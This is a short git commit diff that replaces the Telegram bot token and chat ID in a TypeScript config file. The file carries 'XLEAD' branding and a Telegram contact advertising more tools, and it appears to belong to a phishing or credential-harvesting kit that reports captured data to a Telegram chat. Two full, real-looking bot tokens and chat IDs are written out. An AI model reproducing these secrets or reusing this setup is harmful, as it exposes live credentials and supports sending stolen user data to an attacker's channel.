81d950b38799fbf405f7279821cb528cfb63b273
KjoPo <167812967+KjoPo@users.noreply.github.com>
2026-07-22 00:30:33 +0200

    Update Telegram bot token and chat ID

--- src/app/lib/telegramConfig.ts
+++ src/app/lib/telegramConfig.ts
@@ -1,4 +1,4 @@
 // Powred BY XLEAD.PW
 // MORE TOOLS : Join XLEAD or contact me https://t.me/Oklemalis2
-export const TELEGRAM_BOT_TOKEN = '8388217347:AAE8mK93bf3nK8llSiAmUCVUQO2MrkTEGls';
-export const TELEGRAM_CHAT_ID = '7439770989';
+export const TELEGRAM_BOT_TOKEN = '8672619993:AAGRpAaVqhag3_IZF0Dupq9vBr0dL5SnOAE';
+export const TELEGRAM_CHAT_ID = '8317061382';
